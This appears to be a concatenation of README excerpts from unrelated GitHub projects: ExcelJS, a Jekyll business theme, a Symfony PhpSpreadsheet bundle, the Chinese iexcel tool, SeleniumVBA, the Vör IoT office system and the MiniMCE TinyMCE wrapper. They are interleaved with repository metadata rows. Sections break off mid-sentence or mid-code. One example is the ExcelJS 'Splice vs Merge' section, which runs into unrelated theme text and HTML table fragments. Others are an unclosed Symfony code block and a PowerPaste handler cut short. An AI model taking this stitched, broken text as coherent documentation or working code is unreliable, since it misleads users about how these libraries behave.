The reason the WorksheetWriter does not commit rows as they are added is to allow cells to be merged across rows:

```javascript
worksheet.mergeCells('A1:B2');
worksheet.getCell('A1').value = 'I am merged';
worksheet.getCell('C1').value = 'I am not';
worksheet.getCell('C2').value = 'Neither am I';
worksheet.getRow(2).commit(); // now rows 1 and two are committed.
```

As each worksheet is completed, it must also be committed:

```javascript
// Finished adding data. Commit the worksheet
worksheet.commit();
```

To complete the XLSX document, the workbook must be committed. If any worksheet in a workbook are uncommitted,
 they will be committed automatically as part of the workbook commit.

```javascript
// Finished the workbook.
await workbook.commit();
// ... the stream has been written
```

##### Streaming XLSX Reader(#contents)<!-- Link generated with jump2header -->

The streaming XLSX workbook reader is available in the ExcelJS.stream.xlsx namespace.

The constructor takes a required input argument and an optional options argument:

| Argument              | Description |
| --------------------- | ----------- |
| input (required)      | Specifies the name of the file or the readable stream from which to read the XLSX workbook. |
| options (optional)    | Specifies how to handle the event types occuring during the read parsing. |
| options.entries       | Specifies whether to emit entries (`'emit'`) or not (`'ignore'`). Default is `'emit'`. |
| options.sharedStrings | Specifies whether to cache shared strings (`'cache'`), which inserts them into the respective cell values, or whether to emit them (`'emit'`) or ignore them (`'ignore'`), in both of which case the cell value will be a reference to the shared string's index. Default is `'cache'`. |
| options.hyperlinks    | Specifies whether to cache hyperlinks (`'cache'`), which inserts them into their respective cells, whether to emit them (`'emit'`) or whether to ignore them (`'ignore'`). Default is `'cache'`. |
| options.styles        | Specifies whether to cache styles (`'cache'`), which inserts them into their respective rows and cells, or whether to ignore them (`'ignore'`). Default is `'cache'`. |
| options.worksheets    | Specifies whether to emit worksheets (`'emit'`) or not (`'ignore'`). Default is `'emit'`. |

```js
const workbookReader = new ExcelJS.stream.xlsx.WorkbookReader('./file.xlsx');
for await (const worksheetReader of workbookReader) {
  for await (const row of worksheetReader) {
    // ...
  }
}
```

Please note that `worksheetReader` returns an array of rows rather than each row individually for performance reasons: https://github.com/nodejs/node/issues/31979

###### Iterating over all events(#contents)<!-- Link generated with jump2header -->

Events on workbook are 'worksheet', 'shared-strings' and 'hyperlinks'. Events on worksheet are 'row' and 'hyperlinks'.

```js
const options = {
  sharedStrings: 'emit',
  hyperlinks: 'emit',
  worksheets: 'emit',
};
const workbook = new ExcelJS.stream.xlsx.WorkbookReader('./file.xlsx', options);
for await (const {eventType, value} of workbook.parse()) {
  switch (eventType) {
    case 'shared-strings':
      // value is the shared string
    case 'worksheet':
      // value is the worksheetReader
    case 'hyperlinks':
      // value is the hyperlinksReader
  }
}
```

###### Readable stream(#contents)<!-- Link generated with jump2header -->

While we strongly encourage to use async iteration, we also expose a streaming interface for backwards compatibility.

```js
const options = {
  sharedStrings: 'emit',
  hyperlinks: 'emit',
  worksheets: 'emit',
};
const workbookReader = new ExcelJS.stream.xlsx.WorkbookReader('./file.xlsx', options);
workbookReader.read();

workbookReader.on('worksheet', worksheet => {
  worksheet.on('row', row => {
  });
});

workbookReader.on('shared-strings', sharedString => {
  // ...
});

workbookReader.on('hyperlinks', hyperlinksReader => {
  // ...
});

workbookReader.on('end', () => {
  // ...
});
workbookReader.on('error', (err) => {
  // ...
});
```

# Browser[⬆](#contents)<!-- Link generated with jump2header -->

A portion of this library has been isolated and tested for use within a browser environment.

Due to the streaming nature of the workbook reader and workbook writer, these have not been included.
Only the document based workbook may be used (see <a href=""#create-a-workbook"">Create a Workbook</a> for details).

For example code using ExcelJS in the browser take a look at the <a href=""https://github.com/exceljs/exceljs/tree/master/spec/browser"">spec/browser</a> folder in the github repo.

## Prebundled[⬆](#contents)<!-- Link generated with jump2header -->

The following files are pre-bundled and included inside the dist folder.

* exceljs.js
* exceljs.min.js

# Value Types[⬆](#contents)<!-- Link generated with jump2header -->

The following value types are supported.

## Null Value[⬆](#contents)<!-- Link generated with jump2header -->

Enum: Excel.ValueType.Null

A null value indicates an absence of value and will typically not be stored when written to file (except for merged cells).
  It can be used to remove the value from a cell.

E.g.

```javascript
worksheet.getCell('A1').value = null;
```

## Merge Cell[⬆](#contents)<!-- Link generated with jump2header -->

Enum: Excel.ValueType.Merge

A merge cell is one that has its value bound to another 'master' cell.
  Assigning to a merge cell will cause the master's cell to be modified.

## Number Value[⬆](#contents)<!-- Link generated with jump2header -->

Enum: Excel.ValueType.Number

A numeric value.

E.g.

```javascript
worksheet.getCell('A1').value = 5;
worksheet.getCell('A2').value = 3.14159;
```

## String Value[⬆](#contents)<!-- Link generated with jump2header -->

Enum: Excel.ValueType.String

A simple text string.

E.g.

```javascript
worksheet.getCell('A1').value = 'Hello, World!';
```

## Date Value[⬆](#contents)<!-- Link generated with jump2header -->

Enum: Excel.ValueType.Date

A date value, represented by the JavaScript Date type.

E.g.

```javascript
worksheet.getCell('A1').value = new Date(2017, 2, 15);
```

## Hyperlink Value[⬆](#contents)<!-- Link generated with jump2header -->

Enum: Excel.ValueType.Hyperlink

A URL with both text and link value.

E.g.
```javascript
// link to web
worksheet.getCell('A1').value = {
  text: 'www.mylink.com',
  hyperlink: 'http://www.mylink.com',
  tooltip: 'www.mylink.com'
};

// internal link
worksheet.getCell('A1').value = { text: 'Sheet2', hyperlink: '#\'Sheet2\'!A1' };
```

## Formula Value[⬆](#contents)<!-- Link generated with jump2header -->

Enum: Excel.ValueType.Formula

An Excel formula for calculating values on the fly.
  Note that while the cell type will be Formula, the cell may have an effectiveType value that will
  be derived from the result value.

Note that ExcelJS cannot process the formula to generate a result, it must be supplied.

Note that function semantic names must be in English and the separator must be a comma.

E.g.

```javascript
worksheet.getCell('A3').value = { formula: 'A1+A2', result: 7 };
worksheet.getCell('A3').value = { formula: 'SUM(A1,A2)', result: 7 };
```

Cells also support convenience getters to access the formula and result:

```javascript
worksheet.getCell('A3').formula === 'A1+A2';
worksheet.getCell('A3').result === 7;
```

### Shared Formula[⬆](#contents)<!-- Link generated with jump2header -->

Shared formulae enhance the compression of the xlsx document by decreasing the repetition
of text within the worksheet xml.
The top-left cell in a range is the designated master and will hold the
formula that all the other cells in the range will derive from.
The other 'slave' cells can then refer to this master cell instead of redefining the
whole formula again.
Note that the master formula will be translated to the slave cells in the usual
Excel fashion so that references to other cells will be shifted down and
to the right depending on the slave's offset to the master.
For example: if the master cell A2 has a formula referencing A1 then
if cell B2 shares A2's formula, then it will reference B1.

A master formula can be assigned to a cell along with the slave cells in its range

```javascript
worksheet.getCell('A2').value = {
  formula: 'A1',
  result: 10,
  shareType: 'shared',
  ref: 'A2:B3'
};
```

A shared formula can be assigned to a cell using a new value form:

```javascript
worksheet.getCell('B2').value = { sharedFormula: 'A2', result: 10 };
```

This specifies that the cell B2 is a formula that will be derived from the formula in
A2 and its result is 10.

The formula convenience getter will translate the formula in A2 to what it should be in B2:

```javascript
expect(worksheet.getCell('B2').formula).to.equal('B1');
```

Shared formulae can be assigned into a sheet using the 'fillFormula' function:

```javascript
// set A1 to starting number
worksheet.getCell('A1').value = 1;

// fill A2 to A10 with ascending count starting from A1
worksheet.fillFormula('A2:A10', 'A1+1', [2,3,4,5,6,7,8,9,10]);
```

fillFormula can also use a callback function to calculate the value at each cell

```javascript
// fill A2 to A100 with ascending count starting from A1
worksheet.fillFormula('A2:A100', 'A1+1', (row, col) => row);
```

### Formula Type[⬆](#contents)<!-- Link generated with jump2header -->

To distinguish between real and translated formula cells, use the formulaType getter:

```javascript
worksheet.getCell('A3').formulaType === Enums.FormulaType.Master;
worksheet.getCell('B3').formulaType === Enums.FormulaType.Shared;
```

Formula type has the following values:

| Name                       |  Value  |
| -------------------------- | ------- |
| Enums.FormulaType.None     |   0     |
| Enums.FormulaType.Master   |   1     |
| Enums.FormulaType.Shared   |   2     |

### Array Formula[⬆](#contents)<!-- Link generated with jump2header -->

A new way of expressing shared formulae in Excel is the array formula.
In this form, the master cell is the only cell that contains any information relating to a formula.
It contains the shareType 'array' along with the range of cells it applies to and the formula that will be copied.
The rest of the cells are regular cells with regular values.

Note: array formulae are not translated in the way shared formulae are.
So if master cell A2 refers to A1, then slave cell B2 will also refer to A1.

E.g.
```javascript
// assign array formula to A2:B3
worksheet.getCell('A2').value = {
  formula: 'A1',
  result: 10,
  shareType: 'array',
  ref: 'A2:B3'
};

// it may not be necessary to fill the rest of the values in the sheet
```

The fillFormula function can also be used to fill an array formula

```javascript
// fill A2:B3 with array formula ""A1""
worksheet.fillFormula('A2:B3', 'A1', [1,1,1,1], 'array');
```


## Rich Text Value[⬆](#contents)<!-- Link generated with jump2header -->

Enum: Excel.ValueType.RichText

Rich, styled text.

E.g.
```javascript
worksheet.getCell('A1').value = {
  richText: [
    { text: 'This is '},
    {font: {italic: true}, text: 'italic'},
  ]
};
```

## Boolean Value[⬆](#contents)<!-- Link generated with jump2header -->

Enum: Excel.ValueType.Boolean

E.g.

```javascript
worksheet.getCell('A1').value = true;
worksheet.getCell('A2').value = false;
```

## Error Value[⬆](#contents)<!-- Link generated with jump2header -->

Enum: Excel.ValueType.Error

E.g.

```javascript
worksheet.getCell('A1').value = { error: '#N/A' };
worksheet.getCell('A2').value = { error: '#VALUE!' };
```

The current valid Error text values are:

| Name                           | Value       |
| ------------------------------ | ----------- |
| Excel.ErrorValue.NotApplicable | #N/A        |
| Excel.ErrorValue.Ref           | #REF!       |
| Excel.ErrorValue.Name          | #NAME?      |
| Excel.ErrorValue.DivZero       | #DIV/0!     |
| Excel.ErrorValue.Null          | #NULL!      |
| Excel.ErrorValue.Value         | #VALUE!     |
| Excel.ErrorValue.Num           | #NUM!       |

# Interface Changes[⬆](#contents)<!-- Link generated with jump2header -->

Every effort is made to make a good consistent interface that doesn't break through the versions but regrettably, now and then some things have to change for the greater good.

## 0.1.0[⬆](#contents)<!-- Link generated with jump2header -->

### Worksheet.eachRow[⬆](#contents)<!-- Link generated with jump2header -->

The arguments in the callback function to Worksheet.eachRow have been swapped and changed; it was function(rowNumber,rowValues), now it is function(row, rowNumber) which gives it a look and feel more like the underscore (_.each) function and priorities the row object over the row number.

### Worksheet.getRow[⬆](#contents)<!-- Link generated with jump2header -->

This function has changed from returning a sparse array of cell values to returning a Row object. This enables accessing row properties and will facilitate managing row styles and so on.

The sparse array of cell values is still available via Worksheet.getRow(rowNumber).values;

## 0.1.1[⬆](#contents)<!-- Link generated with jump2header -->

### cell.model[⬆](#contents)<!-- Link generated with jump2header -->

cell.styles renamed to cell.style

## 0.2.44[⬆](#contents)<!-- Link generated with jump2header -->

Promises returned from functions switched from Bluebird to native node Promise which can break calling code
 if they rely on Bluebird's extra features.

To mitigate this the following two changes were added to 0.3.0:

* A more fully featured and still browser compatible promise lib is used by default. This lib supports many of the features of Bluebird but with a much lower footprint.
* An option to inject a different Promise implementation. See <a href=""#config"">Config</a> section for more details.

# Config[⬆](#contents)<!-- Link generated with jump2header -->

ExcelJS now supports dependency injection for the promise library.
 You can restore Bluebird promises by including the following code in your module...

```javascript
ExcelJS.config.setValue('promise', require('bluebird'));
```

Please note: I have tested ExcelJS with bluebird specifically (since up until recently this was the library it used).
 From the tests I have done it will not work with Q.

# Caveats[⬆](#contents)<!-- Link generated with jump2header -->

## Dist Folder[⬆](#contents)<!-- Link generated with jump2header -->

Before publishing this module, the source code is transpiled and otherwise processed
before being placed in a dist/ folder.
This README identifies two files - a browserified bundle and minified version.
No other contents of the dist/ folder are guaranteed in any way other than the file
specified as ""main"" in the package.json


# Known Issues[⬆](#contents)<!-- Link generated with jump2header -->

## Testing with Puppeteer[⬆](#contents)<!-- Link generated with jump2header -->

The test suite included in this lib includes a small script executed in a headless browser
to validate the bundled packages. At the time of this writing, it appears that
this test does not play nicely in the Windows Linux subsystem.

For this reason, the browser test can be disabled by the existence of a file named .disable-test-browser

```bash
sudo apt-get install libfontconfig
```

## Splice vs Merge[⬆](#contents)<!-- Link generated with jump2header -->

If any splice operation affects a merged cell, the merge group will not be moved correctly

To address this, when an ExcelJS Workbook parses an XLSX file, it will preserve any theme files it finds and include them when writing to a new XLSX. If this behaviour is not desired, the Workbook class exposes a clearThemes() function which will drop the theme content. Note that this behaviour is only implemented in the document based Workbook class, not the streamed Reader and Writer.</p></li></ul> |

| 2.0.1   | <h2>Major Version Change</h2> <p>Introducing async/await to ExcelJS!</p> <p>The new async and await features of JavaScript can help a lot to make code more readable and maintainable. To avoid confusion, particularly with returned promises from async functions, we have had to remove the Promise class configuration option and from v2 onwards ExcelJS will use native Promises. Since this is potentially a breaking change we're bumping the major version for this release.</p> <h2>Changes</h2> <ul> <li> Merged <a href=""https://github.com/exceljs/exceljs/pull/829"">Introduce async/await #829</a>. Many thanks to <a href=""https://github.com/alubbe"">Andreas Lubbe</a> for this contribution. </li> <li> Merged <a href=""https://github.com/exceljs/exceljs/pull/930"">Update index.d.ts #930</a>.

Many thanks to <a href=""https://github.com/drjokepu"">Tamas Czinege</a> for this contributions. </li> <li> Dropped dependencies on Promise libraries. </li> </ul> |
| 3.0.0   | <h2>Another Major Version Change</h2> <p>Javascript has changed a lot over the years, and so have the modules and technologies surrounding it. To this end, this major version of ExcelJS changes the structure of the publish artefacts:</p> <h3>Main Export is now the Original Javascript Source</h3> <p>Prior to this release, the transpiled ES5 code was exported as the package main. From now on, the package main comes directly from the lib/ folder. This means a number of dependencies have been removed, including the polyfills.</p> <h3>ES5 and Browserify are Still Included</h3> <p>In order to support those that still require ES5 ready code (e.g. as dependencies in web apps) the source code will still be transpiled and available  in dist/es5.</p> <p>The ES5 code is also browserified and available as dist/exceljs.js or dist/exceljs.min.js</p> <p><i>See the section <a href=""#importing"">Importing</a> for details</i></p> |

melvinchng,business-jekyll-theme,,https://github.com/melvinchng/business-jekyll-theme,https://api.github.com/repos/business-jekyll-theme/melvinchng,Business Jekyll Theme for your business,"# Business Jekyll Theme

Business Jekyll Theme is a theme that is designed to be used for small and medium business. It is designed by a team from [Technext](https://github.com/technext/). The theme is then ported over by [Melvin Ch'ng](http://melvinchng.github.io) for Jekyll support. The original source code can be obainted from Technext's [repository](https://github.com/technext/office)

Unlike most Jekyll Themes, Business Jekyll Theme is not meant to be a single page theme. This theme is a package that you can use for your business website or promote certain project. I reorganized all the files and make it Jekyll friendly.

Big thanks to the creator of Office as this theme would not be possible without their hard work! You are always welcome to contribute to this repository to make it better!

**Example Site**
- [Business Jekyll Theme](https://business-jekyll-theme.github.io)

**Example Site From The Original Creator**
- [Office Template](http://demo.themewagon.com/preview/office-responsive-multipage-bootstrap-template)

## Feature
- Responsive layout
- CSS Framework - Bootstrap 3
- Beautiful icons by Fontawesome
- Clean, simple and elegant
- Multi page Template
- Well commented and structured coding
- Easy to use
- It's Free!

## Note
I removed certain features from the original theme packages as we do not really need it. I modified the original source code slightly to make it more mobile friendly and reusable. 

## Installation
1. For first time user, you have to install Ruby and Rails. If you do not have Ruby on Rails installed, you may follow [this tutorial](http://melvinchng.github.io/rails/RubyOnRailsInstallation.html) that I wrote for Windows, Linux, and MacOS (installation videos are included).
2. Install Jekyll by using the command `gem install jekyll`.
3. Start your localhost server by using the command `jekyll serve`. Make sure that you are at the root directory of your folder before using this command.
4. Your site should be accessible at `localhost:4000`.
5. For additional information about Jekyll, refer to the [official website](http://jekyllrb.com/).

eightyknots,phpspreadsheet-bundle,,https://github.com/eightyknots/phpspreadsheet-bundle,https://api.github.com/repos/phpspreadsheet-bundle/eightyknots,A Symfony bundle to integrate with PHPOffice's PhpSpreadsheet library,"# PhpSpreadsheetBundle

This bundle integrates your Symfony 3/4/5 app with the PHPOffice PhpSpreadsheet
productivity library.

## Requirements

This bundle requires, in addition to prerequisites of each PHPOffice library:

    * PHP 7.2 or higher
    * Symfony 4 or higher

Note: Tags older than v1.0.0 (e.g. v0.2.0) are no longer supported due to deprecated status for both PHP <= 7.1 and Symfony <= 4.4.
    
## Installation

Use composer to require the latest stable version.

````bash
$ composer require yectep/phpspreadsheet-bundle
````

If you're not using Flex, enable the bundle in your `AppKernel.php` or `bundles.php` file.

````php
$bundles = array(
    [...]
    new Yectep\PhpSpreadsheetBundle\PhpSpreadsheetBundle(),
);
````

## Usage

This bundle enables the `phpoffice.spreadsheet` service.

See also the official [PHPOffice PhpSpreadsheet documentation](http://phpspreadsheet.readthedocs.io/).

### createSpreadsheet()

Creates an empty `\PhpOffice\PhpSpreadsheet\Spreadsheet` object, or, if an optional 
`$filename` is passed, instantiates the `\PhpOffice\PhpSpreadsheet\IOFactory` to
automatically detect and use the appropriate `IWriter` class to read the file.

````php
// In your controller
$newSpreadsheet = $this->get('phpoffice.spreadsheet')->createSpreadsheet();
$existingXlsx   = $this->get('phpoffice.spreadsheet')->createSpreadsheet('/path/to/file.xlsx');
````

### createReader(`string` $type)

Returns an instance of the `\PhpOffice\PhpSpreadsheet\Reader` class of the given `$type`.

Types are case sensitive. Supported types are:

* `Xlsx`: Excel 2007
* `Xls`: Excel 5/BIFF (95)
* `Xml`: Excel 2003 XML
* `Slk`: Symbolic Link (SYLK)
* `Ods`: Open/Libre Office (ODS)
* `Csv`: CSV
* `Html`: HTML

````php
$readerXlsx  = $this->get('phpoffice.spreadsheet')->createReader('Xlsx');
$spreadsheet = $readerXlsx->load('/path/to/file.xlsx');
````

### createWriter(`Spreadsheet` $spreadsheet, `string` $type)

Given a `\PhpOffice\PhpSpreadsheet\Spreadsheet` object and a writer `$type`, returns
an instance of a `\PhpOffice\PhpSpreadsheet\Writer` class for that type.

In addition the the read types above, these types are additionally supported for writing, if
the appropriate PHP libraries are installed.

* `Tcpdf`
* `Mpdf`
* `Dompdf`

````php
$spreadsheet = $this->get('phpoffice.spreadsheet')->createSpreadsheet();
$spreadsheet->getActiveSheet()->setCellValue('A1', 'Hello world');

$writerXlsx = $this->get('phpoffice.spreadsheet')->createWriter($spreadsheet, 'Xlsx');
$writerXlsx->save('/path/to/destination.xlsx');
````

## Roadmap and Contributions

Contributions are more than welcome. Fork the project, and submit a PR when you're done.

Remaining todos include:

* Tests and test coverage
* TravisCI
* Improved documentation

## Symfony serializer

If you are migrating from Symfony Serializer component + CSV encoder - you can use code like

```
$spreadsheet = $this->get('phpoffice.spreadsheet')->createSpreadsheet();
$sheet = $spreadsheet->getActiveSheet();
$sheet->setTitle($this->filterVars['wareCategory']->getTitle());
$columnsMap = [];
$lineIndex = 2;
foreach ($data as $line) {
   foreach ($line as $columnName=>$columnValue) {
       if (is_int($columnIndex = array_search($columnName, $columnsMap))) {
           $columnIndex++;
       } else {
           $columnsMap[] = $columnName;
           $columnIndex = count($columnsMap);
       }
       $sheet->getCellByColumnAndRow($columnIndex, $lineIndex)->setValue($columnValue);
   }
   $lineIndex++;
}
foreach ($columnsMap as $columnMapId=>$columnTitle) {
   $sheet->getCellByColumnAndRow($columnMapId+1, 1)->setValue($columnTitle);
}
$writer = $this->get('phpoffice.spreadsheet')->createWriter($spreadsheet, 'Xlsx');
ob_start();
$writer->save('php://output');
$excelOutput = ob_get_clean();

return new Response(
   $excelOutput,
   200,
   [
       'content-type'        =>  'text/x-csv; charset=windows-1251',
       'Content-Disposition' => 'attachment; filename=""price.xlsx""'
   ]
);

## 变更日志

> [变更日志](CHANGELOG.md)

## v0.0.9 主要变更

Fixed [@ExcelField注解失效问题](https://github.com/houbb/iexcel/issues/7)

# 创作缘由

实际工作和学习中，apache poi 操作 excel 过于复杂。

近期也看了一些其他的工具框架：

- easypoi

- easyexcel

- hutool-poi

都或多或少难以满足自己的实际需要，于是就自己写了一个操作 excel 导出的工具。

实现：在阿里 [easyexcel](https://github.com/alibaba/easyexcel) 的基础上进行封装，提升使用的简易度。

# 快速开始

## 环境要求

jdk1.8+

maven 3.x

## 引入 jar

使用 maven 管理。

```xml
<dependency>
     <groupId>com.github.houbb</groupId>
     <artifactId>iexcel</artifactId>
     <version>1.0.0</version>
</dependency>
```

## Excel 写入

### 示例

```java
// 基本属性
final String filePath = PathUtil.getAppTestResourcesPath()+""/excelHelper.xls"";
List<User> models = User.buildUserList();

// 直接写入到文件
ExcelHelper.write(filePath, models);
```

其中：

- User.java

```java
public class User {

    private String name;

    private int age;

    //fluent getter/setter/toString()
}
```

- buildUserList()

构建对象列表方法如下：

```java
/**
 * 构建用户类表
 * @return 用户列表
 * @since 0.0.4
 */
public static List<User> buildUserList() {
    List<User> users = new ArrayList<>();
    users.add(new User().name(""hello"").age(20));
    users.add(new User().name(""excel"").age(19));
    return users;
}
```

### 写入效果

excel 内容生成为：

```
name	age
hello	20
excel	19
```

## Excel 读取

### 示例

```java
final String filePath = PathUtil.getAppTestResourcesPath()+""/excelHelper.xls"";
List<User> userList = ExcelHelper.read(filePath, User.class);
```

### 信息

```
[User{name='hello', age=20}, User{name='excel', age=19}]
```

## SAX 读

```java
// 待生成的 excel 文件路径
final String filePath = PathUtil.getAppTestResourcesPath()+""/excelReadBySax.xls"";

        AbstractSaxReadHandler<User> saxReadHandler = new AbstractSaxReadHandler<User>() {
            @Override
            protected void doHandle(int i, List<Object> list, User user) {
                System.out.println(user);
            }
        };

ExcelHelper.readBySax(User.class, saxReadHandler, filePath);
```

Just download/install any one of the provided [SeleniumVBA solutions](https://github.com/GCuser99/SeleniumVBA/tree/main/dist) and then run one of the subs in the ""test"" Standard modules. If the Selenium WebDriver does not exist, or is out-of-date, SeleniumVBA will detect this automatically and download the appropriate driver to a [configurable location](https://github.com/GCuser99/SeleniumVBA/wiki#advanced-customization) on your system.

Driver updates can also be programmatically invoked via the [WebDriverManager class](https://github.com/GCuser99/SeleniumVBA/wiki/Object-Model-Overview#webdrivermanager).

The [twinBASIC](https://twinbasic.com/preview.html) ActiveX DLL solution requires no dependencies (such as .Net Framework). To try it, download and run the installer in the [dist folder](https://github.com/GCuser99/SeleniumVBA/tree/main/dist).

## SendKeys Example

```vba
Sub doSendKeys()
    Dim driver As New WebDriver
    Dim keys As New WebKeyboard
    
    driver.StartChrome
    driver.OpenBrowser
    
    driver.NavigateTo ""https://www.google.com/""
    driver.Wait 1000
    
    keySeq = ""This is COOKL!"" & keys.Repeat(keys.LeftKey, 3) & keys.DeleteKey & keys.ReturnKey
    
    driver.FindElement(By.Name, ""q"").SendKeys keySeq
    driver.Wait 2000
    
    driver.CloseBrowser
    driver.Shutdown
End Sub
```

## File Download Example
```vba
Sub doFileDownload()
    Dim driver As New WebDriver
    Dim caps As WebCapabilities
   
    driver.StartChrome
    
    'set the directory path for saving download to
    Set caps = driver.CreateCapabilities
    caps.SetDownloadPrefs "".\""
    driver.OpenBrowser caps
    
    'delete legacy copy if it exists
    driver.DeleteFiles "".\test.pdf""
    
    driver.NavigateTo ""https://github.com/GCuser99/SeleniumVBA/raw/main/dev/test_files/test.pdf""

    'wait until the download is complete before closing browser
    driver.WaitForDownload "".\test.pdf""
    
    driver.CloseBrowser
    driver.Shutdown
End Sub
```

## Action Chain Example
```vba
Sub doActionChain()
    Dim driver As New WebDriver
    Dim keys As New WebKeyboard
    Dim actions As WebActionChain
    Dim elemSearch As WebElement
    
    driver.StartChrome
    driver.OpenBrowser
    
    driver.NavigateTo ""https://www.google.com/""
    driver.Wait 1000
    
    Set elemSearch = driver.FindElement(By.Name, ""btnK"")
    
    Set actions = driver.ActionChain
    
    'build the chain and then execute with Perform method
    actions.KeyDown(keys.ShiftKey).SendKeys(""upper case"").KeyUp(keys.ShiftKey)
    actions.MoveToElement(elemSearch).Click().Perform

    driver.Wait 2000
    
    driver.CloseBrowser
    driver.Shutdown
End Sub
```

futurice,vor,futurice,https://github.com/futurice/vor,https://api.github.com/repos/vor/futurice,The new IoT Office Experience.,"# [Vör](http://vor.space)

To purify your place of work, sprinkle water and say: *""By Vör be cleansed, darkness return, to darkness below""  [*](http://www.northernpaganism.org/shrines/handmaidens/vor/who-is.html)*

[Vör (homepage)](http://vor.space) is open source software and hardware for turning your open office into an open, real-time map for finding people, open work places and current events. Vör is pronounced ""FOR"" as in ""forward"".

This project is currently migrating from other repos and undergoing active development. Expect cool, but don't expect stability.

## Summary

Vör is an intranet for IoT. It is a decentralized and vendor-agnostic to find out where people are in your office, find a quiet place to work, find someone to play a game with or check air quality. The reference implementation here is all open source. We are doing things as we think they should be and hope that stimulates you to join the conversation and add your innovative ideas. Lets make the world a better place where services are created and controlled directly by the people using them for the needs they themselves define and want. Making that as easy as possible is our goal.

You can download the Node.js server, Android client, and optionally IoT sensors and actuators for providing additional information about your workspace to your employees and visitors. Parametric models for 3D printing the sensors and actuators are also provided so you can tailor the look of your office and add new ""things"" relatively easily. Everything is open source with permissive licenses. We try to define services based on the user experience (UX) and map that on to the many capabilities open to taking that beyond the touchscreen in your pocket. Have fun and let's play!

### Technical Summary

You create a vör.space for yourself by placing any beacons and additional Internet of Things (IoT) sensors and actuators around your place of work. Users can then choose to run an Android or iOS application to access this and provide their current indoor location triangulated off of nearby beacons. A webserver running Node.js is setup inside your WLAN for privacy and security- no cloud snooping allowed. Everything is messages. All messages are passed to the Node server which echoes them to everyone else who is currently connected and has send a ""subscribe"" message. No persistent records are kept for privacy reasons. We want to know what is happening now and in the recent past, but it changes the social nature of the converstaion if someone is snooping that data and keeping it around for other purposes. The Node server keeps an in-memory copy of recent messages for 15minutes (configurable).

All communication is JSON by websockets with end-to-end push. IoT nodes such as Arduino may use HTTP POST if that is easier. There are not multiple URLs like in a REST services you may be more familiar with. Instead there are different messages. You can freely define new messages by changing JSON fields- no server changes are required.

All communication is stateless from the standpoint of the client. The client, usually a mobile phone, sends messsages and forgets about them. The server sends messages which are complete by themselves. This is different from the more standard HTTP request-response.

Please have a look at the subdirectories corresponding to the different parts of this setup for additional details. The /doc director has additional information as it is available.

#### Starting points depending on your interest:

[JSON](/doc/json-schema.md) describing the different messages sent and received by phones and Arduinos, echoed to clients on the local WLAN by the Node.js server to create a local bus with end-to-end push using websockets

[Design](/design/README.md) visual design assets

[Android](/vor-android/README.md) for the Android client to track your location indoors and interact with the map and service cards. A custom build for fixed table display helps office visitor interact with the service.

[iOS](/vor-ios/README.md) for the iPhone client to track your location indoors

[Backend](/vor-backend/README.md) concerning the Node.js server

[Backend Image Client](/vor-image-client/README.md) concerning the Node.js image service

[Arduino](/vor-arduino/README.md) and [Raspberry Pi 2](/vor-image-client/README.md) about the custom hardware for IoT sensors and actuators to setup your office

[3D Models](/vor-3d-models/README.md) for the custom Arduio and Raspberry Pi 2 IoT nodes

iOS is definitely planned, starting with a simple app to share current location. Unfortunately it is not in the minimum viable product (MVP) test we have going on at this early stage.

## 对比 tinymce-vue
是的，TinyMCE 已经有官方的 Vue 封装 [tinymce-vue](https://github.com/tinymce/tinymce-vue) 了，但它：

- 需要加载至少 **380kB** 的网络资源 (开启插件全家桶将达到 **563kB**，还没算上付费插件)，外网会很慢，甚至超时
- 有[域名检测](#域名检测)，会弹窗警告
- 用不同的版本号来适配不同的 Vue 版本，升级成本较高
- 默认功能最小化，需要繁杂的配置，还不支持全局传参

## 获取 [TinyMCE Editor](https://www.tiny.cloud/docs/tinymce/6/apis/tinymce.editor/) 实例

```vue
<!-- 示例: 监听 TinyMCE 的事件 -->

<script setup>
import { reactive, ref } from 'vue'
import tinymce from 'tinymce/tinymce'

const miniMCERef = ref()
const options = reactive({
  setup(editor) {
    // 方式1
    editor.on('init', (e) => {
      console.log('init', e)

      // 方式2
      tinymce.get(miniMCERef.value.id).on('Change', (e) => {
        console.log('Change', e)
      })

      // 方式3
      tinymce.activeEditor.on('Change', (e) => {
        console.log('Change', e)
      })
    })
  },
  // 方式4
  init_instance_callback(editor) {
    editor.on('Change', (e) => {
      console.log('Change', e)
    })
  },
})
</script>

<template>
  <MiniMCE
    ref=""miniMCERef""
    :options=""options""
  />
</template>
```

<br>

## 显隐控制

请使用 `v-if` 控制显隐。

由于实际的富文本元素并没有挂载在 `options.selector` 上面，所以使用 `v-show` 切换显隐会有问题。

<br>

## 内容样式

富文本的内容样式建议在展示侧自行添加，而不是在富文本的生产侧添加，因为：

1. 富文本的生产侧无法满足展示侧各自的定制化需求
2. 展示侧可能包含小程序，小程序不支持 `style` 标签

<br>

<a name=""域名检测""></a>

## 域名检测

TinyMCE 有四种价格计划：

- Core (免费)
- Essential
- Professional
- Flexible

如果没有注册 Tiny 账号、或者没有在账号设置中登记域名，界面上会有警告弹出 (**即使你使用的是免费的 Core 计划**)

> 当然，你可以用 CSS 来屏蔽弹窗，只是不推荐这种方式

TinyMCE 提供了两种加载方式：

- CDN (tinymce-vue 采用的方式)：需要注册账号以提供 `api-key`，并在账号设置中登记所有用到 TinyMCE 的项目域名
- NPM (MiniMCE 采用的方式)：没有 `api-key` 参数，所以不需要注册账号、不需要登记域名，参考 [Tiny 官方解释](https://stackoverflow.com/questions/63398432/how-to-use-tinymce-5-api-key-using-npm)

## 粘贴 Word 文档

TinyMCE 提供了 premium 插件 PowerPaste，可用于粘贴 Word 文档，但兼容性一般，尤其是不支持 WPS

MiniMCE 提供了插入 Word 文档的插件示例，兼容 Microsoft Office、WPS，可在一定程度上替代 PowerPaste

注意：粘贴可以片段粘贴，插入只能整个文档插入

### PowerPaste 插件

```ts
// PowerPaste 配置示例

import MiniMCE from 'minimce'
import axios from 'axios'
import createAxiosShortcut from 'axios-shortcut'

const { POST } = createAxiosShortcut(axios)

app.use(MiniMCE, {
  options: {
    images_upload_handler(blobInfo, success, failure) {
      const blob = blobInfo.blob()
      const file = new File(
        [blob],
        blobInfo.filename(),
        { type: blob.type }
      )

      POST.upload(process.env.VUE_APP_UPLOAD_API, {
        file
      }).then((res) => {
        if (typeof res.data?.data === 'string') {
          success(res.data.data)

- 兼容性
  ![PowerPaste 插件兼容性](https://raw.githubusercontent.com/cloydlau/minimce/main/powerpaste-compatibility.png)

- 受浏览器限制，PowerPaste 插件**无法支持微软 Word 和 Excel 文档所支持的<font color=""#dd0000"">所有</font>图片类型**
